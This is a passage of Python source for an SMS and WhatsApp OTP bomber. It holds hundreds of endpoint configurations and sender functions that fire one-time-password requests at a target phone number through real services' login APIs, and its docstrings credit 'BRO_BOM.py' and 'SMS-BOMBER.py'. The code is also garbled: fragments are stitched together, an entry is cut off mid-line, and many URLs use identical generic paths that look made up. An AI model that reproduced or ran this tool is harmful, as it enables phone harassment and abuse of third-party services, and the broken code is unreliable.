    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 258
{
    'name': 'Google_Meet_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://meet.google.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 259
{
    'name': 'Cisco_Webex_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://webex.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 260
{
    'name': 'Adobe_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://adobe.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 261
{
    'name': 'Figma_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://figma.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 262
{
    'name': 'Canva_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://canva.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 263
{
    'name': 'Sketch_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://sketch.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 264
{
    'name': 'InVision_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://invisionapp.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 265
{
    'name': 'Marvel_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://marvelapp.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 266
{
    'name': 'Proto_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://proto.io/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 267
{
    'name': 'UXPin_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://uxpin.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Balsamiq_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://balsamiq.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 269
{
    'name': 'Axure_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://axure.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 270
{
    'name': 'MockFlow_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://mockflow.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 271
{
    'name': 'Wireframe_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://wireframe.cc/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 272
{
    'name': 'Mockplus_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://mockplus.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 273
{
    'name': 'JustInMind_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://justinmind.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 274
{
    'name': 'Pidoco_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://pidoco.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 275
{
    'name': 'HotGloo_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://hotgloo.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 276
{
    'name': 'FluidUI_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://fluidui.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 277
{
    'name': 'Framer_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://framer.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 278
{
    'name': 'Origami_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://origami.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 279
{
    'name': 'Principle_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://principle.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 280
{
    'name': 'Keynote_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://keynote.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 281
{
    'name': 'PowerPoint_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://powerpoint.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 282
{
    'name': 'Slides_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://slides.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 283
{
    'name': 'Prezi_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://prezi.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'SlideShare_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://slideshare.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 285
{
    'name': 'HaikuDeck_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://haikudeck.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 286
{
    'name': 'Emaze_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://emaze.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 287
{
    'name': 'Sway_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://sway.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 288
{
    'name': 'Visme_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://visme.co/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 289
{
    'name': 'Beautiful_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://beautiful.ai/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 290
{
    'name': 'Gamma_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://gamma.app/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 291
{
    'name': 'Tome_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://tome.app/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 292
{
    'name': 'Pitch_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://pitch.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 293
{
    'name': 'Zight_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://zight.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 294
{
    'name': 'Loom_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://loom.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 295
{
    'name': 'ScreenRec_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://screenrec.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 296
{
    'name': 'OBS_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://obsproject.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 297
{
    'name': 'Streamlabs_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://streamlabs.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 298
{
    'name': 'Restream_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://restream.io/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 299
{
    'name': 'StreamElements_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://streamelements.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Nightbot_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://nightbot.tv/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
}
# 301
{
    'name': 'Mobcrush_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mobcrush.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 302
{
    'name': 'Bigo_Live_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bigo.tv/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 303
{
    'name': 'Mico_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mico.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 304
{
    'name': 'Azar_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.azar.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 305
{
    'name': 'Hago_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hago.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 306
{
    'name': 'Yalla_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.yalla.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 307
{
    'name': 'Chamet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.chamet.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 308
{
    'name': 'Lemo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lemo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 309
{
    'name': 'Tumile_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tumile.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 310
{
    'name': 'MeeLive_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meelive.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 311
{
    'name': 'StarMaker_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.starmaker.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 312
{
    'name': 'Smule_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smule.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 313
{
    'name': 'Starmaker_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.starmaker.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 314
{
    'name': 'Smule_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smule.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
}
{
    'name': 'Triller_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.triller.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 316
{
    'name': 'Likee_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.likee.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 317
{
    'name': 'Bigo_Live_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bigolive.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 318
{
    'name': 'Kuaishou_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kuaishou.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 319
{
    'name': 'Douyin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.douyin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 320
{
    'name': 'Helo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.helo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda ph
    {
        "name": "ShipRocket SMS",
        "type": "SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik SMS",
        "type": "SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe SMS",
        "type": "SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    
    # === WhatsApp APIs ===
    {
        "name": "KPN WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Rappi WhatsApp",
        "type": "WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "type": "WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    
    # === Additional Working APIs ===
    {
        "name": "Wakefit SMS",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Doubtnut",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "BeepKart",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Smytten",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "MyHubble Money",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Housing.com",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Animall",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "Cosmofeed",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Spencer's",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Shopper's Stop",
        "type": "SMS",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Lifestyle Stores",
        "type": "SMS",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "PokerBaazi",
        "type": "SMS",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "type": "SMS",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "RummyCircle",
        "type": "SMS",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    @staticmethod
    def send_oyo(phone, cc):
        """OYO Rooms - from BRO_BOM.py"""
        try:
            url = f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B{cc}&nod=4&phone={phone}"
            headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_flipkart(phone, cc):
        """Flipkart - from BRO_BOM.py"""
        try:
            url = "https://www.flipkart.com/api/6/user/signup/status"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"loginId": [f"+{cc}{phone}"], "supportAllStates": True}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_pharmeasy(phone, cc):
        """PharmEasy - from BRO_BOM.py"""
        try:
            url = "https://pharmeasy.in/api/auth/requestOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"contactNumber": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_practo(phone, cc):
        """Practo - from BRO_BOM.py"""
        try:
            url = "https://accounts.practo.com/send_otp"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'client_name': 'Practo Android App', 'mobile': f'+{cc}{phone}'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return "success" in r.text.lower() or r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_goibibo(phone, cc):
        """GoIbibo - from BRO_BOM.py"""
        try:
            url = "https://www.goibibo.com/common/downloadsms/"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mbl': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_pizzahut(phone, cc):
        """PizzaHut - from BRO_BOM.py"""
        try:
            url = "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"customer": {"MobileNo": phone, "UserName": phone, "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_altbalaji(phone, cc):
        """AltBalaji - from SMS-BOMBER.py"""
        try:
            url = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"country_code": cc, "phone_number": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_ajio(phone, cc):
        """Ajio - from BRO_BOM.py"""
        try:
            url = "https://www.ajio.com/api/auth/signupSendOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"firstName": "User", "login": "user@gmail.com", "password": "Pass@123", "mobileNumber": phone, "requestType": "SENDOTP"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return '"statusCode":"1"' in r.text or r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_lenskart(phone, cc):
        """Lenskart - from BRO_BOM.py"""
        try:
            url = "https://www.ref-r.com/clients/lenskart/smsApi"
